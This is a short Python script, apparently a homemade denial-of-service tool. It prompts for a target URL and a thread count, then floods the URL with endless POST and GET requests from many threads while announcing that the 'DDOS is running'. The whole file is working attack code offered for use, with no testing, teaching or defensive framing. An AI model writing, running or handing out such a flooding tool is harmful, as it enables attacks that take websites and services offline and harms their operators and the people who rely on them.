import requests
from threading import Thread

url = input('Url: ')
thrnom = int(input('Threads: '))

def ddos():
     while True:
        spam = requests.post(url)
        spam = requests.get(url)

for i in range(thrnom):
    thr = Thread(target=ddos)
    thr.start()

print('DDOS is running...')